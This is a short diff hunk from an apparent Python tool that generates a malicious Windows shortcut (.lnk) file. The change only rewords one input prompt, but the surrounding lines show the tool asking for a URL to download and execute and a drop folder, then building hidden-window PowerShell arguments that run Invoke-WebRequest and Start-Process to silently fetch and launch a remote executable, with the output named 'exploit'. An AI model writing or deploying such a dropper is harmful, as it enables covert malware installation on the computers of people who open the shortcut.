@@ -11,7 +11,7 @@ extension = ".lnk"
 exe = ".exe"
 location = input(" Enter URL to Download & Execute File: \n")
 drop = input("Enter the location where you want the file to be dropped: \n")
-filenamee = input ("\n Enter a FileName for your Shortcut:")
+filenamee = input ("\n Enter a FileName for your exe dropped:")
 arguments = "-windowstyle hidden Invoke-WebRequest "+location+" -Outfile "+drop+"\\"+filenamee+exe+"; Start-Process "+drop+"\\"+filenamee+exe
 filename = "exploit"
 
